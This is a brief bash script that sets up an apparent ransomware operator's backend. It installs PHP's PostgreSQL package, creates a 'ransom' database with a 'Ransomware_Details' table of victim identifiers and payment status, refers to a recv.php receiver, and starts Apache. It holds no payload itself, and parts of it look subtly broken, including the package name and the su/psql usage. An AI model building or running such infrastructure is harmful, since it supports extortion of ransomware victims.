#!/bin/bash
echo "[+]Installing important stuff"
apt-get install php7.4.-pgsql


echo "[+]Setting up psql server"
su - postgres && psql -c "CREATE DATABASE ransom;"
su - postgres && psql -c "\c ransom; create TABLE Ransomware_Details(\
	identifier VARCHAR(20) UNIQUE NOT NULL,\
	payment_status VARCHAR(10) NOT NULL
	);"

echo "[!]Change the config file pg_hba.conf and set auth method to md5 for postgres user\nChange the password of postgres to admin (Not Recommended) or change the postgress password in recv.php file"

echo "[+]Starting apache server"
service apache2 start
